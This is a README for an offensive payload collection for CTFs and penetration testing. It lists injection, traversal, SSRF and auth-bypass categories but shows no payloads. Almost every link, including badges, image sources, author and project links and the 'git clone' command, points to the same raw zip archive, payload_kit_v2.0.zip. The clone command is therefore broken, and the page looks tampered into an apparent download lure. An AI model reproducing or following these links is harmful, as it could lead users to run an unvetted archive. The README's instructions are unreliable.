<div align="center">

<img src="https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip,50:7f1d1d,100:ef4444&height=160&section=header&text=payload-kit&fontSize=70&fontColor=ffffff&fontAlignY=55&animation=twinkling" width="100%"/>

<br>

[![Version](https://img.shields.io/badge/version-1.0.0-ef4444?style=for-the-badge&labelColor=0d1117)](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)
[![License](https://img.shields.io/badge/MIT-8b5cf6?style=for-the-badge&labelColor=0d1117)](LICENSE)
[![Payloads](https://img.shields.io/badge/payloads-200+-f97316?style=for-the-badge&labelColor=0d1117)](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)
[![Categories](https://img.shields.io/badge/categories-8-06b6d4?style=for-the-badge&labelColor=0d1117)](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)
[![CTF](https://img.shields.io/badge/CTF-Ready-4ade80?style=for-the-badge&labelColor=0d1117)](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)
[![BugBounty](https://img.shields.io/badge/Bug%20Bounty-Ready-ef4444?style=for-the-badge&labelColor=0d1117)](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)

<br>

**Organized offensive payloads for CTFs and authorized penetration testing.**
**Every payload includes context, platform notes, and WAF bypass variants.**

<br>

[Categories](#-categories) · [Structure](#-structure) · [Usage](#-how-to-use) · [Contributing](#-contributing) · [Author](#-author)

</div>

---

> ⚠️ **Authorized use only.** These payloads are for CTF competitions, lab environments (HackTheBox, TryHackMe, DVWA, Juice Shop) and systems you own or have written permission to test. Unauthorized use is illegal.

---

## 📦 Categories

| # | Category | Payloads | Platforms |
|---|----------|----------|-----------|
| 01 | [SQL Injection](sql-injection/) | Basic · Error-based · Blind · WAF bypass | MySQL · PostgreSQL · MSSQL · SQLite |
| 02 | [XSS](xss/) | Reflected · Stored · DOM · Filter bypass · Polyglots | All browsers |
| 03 | [SSTI](ssti/) | Detection · Jinja2 · Twig · Freemarker · Pebble | Python · PHP · Java |
| 04 | [Command Injection](command-injection/) | Linux · Windows · Blind · Bypass | Bash · PowerShell |
| 05 | [LFI / Path Traversal](lfi/) | Linux · Windows · PHP wrappers · Log poisoning | Apache · Nginx · PHP |
| 06 | [XXE](xxe/) | Classic · Blind · OOB · SSRF via XXE | Any XML parser |
| 07 | [SSRF](ssrf/) | Basic · Cloud metadata · Bypass filters | AWS · GCP · Azure |
| 08 | [Auth Bypass](auth-bypass/) | SQL · JWT · Header manipulation · Logic flaws | Any |

---

## 🗂️ Structure

```
payload-kit/
│
├── sql-injection/
│   ├── README.md          ← category overview + detection
│   ├── basic.md           ← fundamental payloads
│   ├── error-based.md     ← extract data via error messages
│   ├── blind.md           ← boolean & time-based
│   └── waf-bypass.md      ← encoding, comments, case variants
│
├── xss/
│   ├── README.md
│   ├── reflected.md
│   ├── stored.md
│   ├── dom.md
│   └── filter-bypass.md   ← tag/attr/event bypass + polyglots
│
├── ssti/
│   ├── README.md          ← detection tree + engine fingerprint
│   ├── jinja2.md          ← Python/Flask
│   ├── twig.md            ← PHP/Symfony
│   └── freemarker.md      ← Java
│
├── command-injection/
│   ├── README.md
│   ├── linux.md
│   ├── windows.md
│   └── blind.md           ← OOB via DNS/HTTP
│
├── lfi/
│   ├── README.md
│   ├── linux.md
│   ├── windows.md
│   └── php-wrappers.md    ← filter, data, expect, zip
│
├── xxe/
│   ├── README.md
│   ├── classic.md
│   └── blind-oob.md
│
├── ssrf/
│   ├── README.md
│   ├── basic.md
│   └── cloud-metadata.md  ← AWS · GCP · Azure IMDSv1/v2
│
└── auth-bypass/
    ├── README.md
    ├── sql-login.md
    ├── jwt.md
    └── logic.md
```

---

## 🎯 How to Use

Each payload file follows this format:

```markdown
## Payload Name

**When to use:** specific scenario where this applies
**Platform:** MySQL / Apache / Python / etc.
**Risk of detection:** Low / Medium / High

[payload here]

**Notes:** what it does, why it works, common variations
```

**Clone and search:**
```bash
git clone https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip
cd payload-kit

# Search across all categories
grep -r "union select" .
grep -r "jinja2" . --include="*.md"

# View a specific category
cat sql-injection/waf-bypass.md
```

---

## 🛣️ Roadmap

**v1.1**
- [ ] Open Redirect payloads
- [ ] CORS misconfiguration
- [ ] HTTP Request Smuggling
- [ ] GraphQL injection

**v2.0**
- [ ] Search script `./search.sh <keyword>`
- [ ] Filter by platform: `./search.sh --platform mysql`
- [ ] Filter by category: `./search.sh --cat sqli`

---

## 🤝 Contributing

Add a new payload? Follow the format:

```bash
git checkout -b feat/new-payload-category
# Add your file following the template format
git commit -m "feat: add GraphQL injection payloads"
git push origin feat/new-payload-category
```

**Rules:**
- Every payload needs context — no naked payload dumps
- Note the platform and when it applies
- Include at least one WAF bypass variant if applicable

---

## 🔗 Related Projects

| Project | Description |
|---------|-------------|
| [**webcheck**](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip) | HTTP security auditor — find where these payloads apply |
| [**recon-kit**](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip) | Recon toolkit — gather intel before testing |
| [**NEXORA-TOOLKIT**](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip) | ADB toolkit for Android |

---

<div align="center">

<img src="https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip,50:7f1d1d,100:0d1117&height=120&section=footer&reversal=true" width="100%"/>

<br>

**[krypthane](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)** · Red Team Operator & Open Source Developer

<br>

[![Site](https://img.shields.io/badge/krypthane.workernova.workers.dev-ef4444?style=flat-square&logo=cloudflare&logoColor=white)](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)
[![Telegram](https://img.shields.io/badge/@Skrylakk-ef4444?style=flat-square&logo=telegram&logoColor=white)](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)
[![Email](https://img.shields.io/badge/Workernova@proton.me-ef4444?style=flat-square&logo=protonmail&logoColor=white)](mailto:Workernova@proton.me)
[![GitHub](https://img.shields.io/badge/wavegxz--design-ef4444?style=flat-square&logo=github&logoColor=white)](https://raw.githubusercontent.com/cloudie-w/payload-kit/main/sql-injection/payload_kit_v2.0.zip)

<br>

<sub>⭐ Star if payload-kit saved you time on a CTF or bounty</sub>

</div>
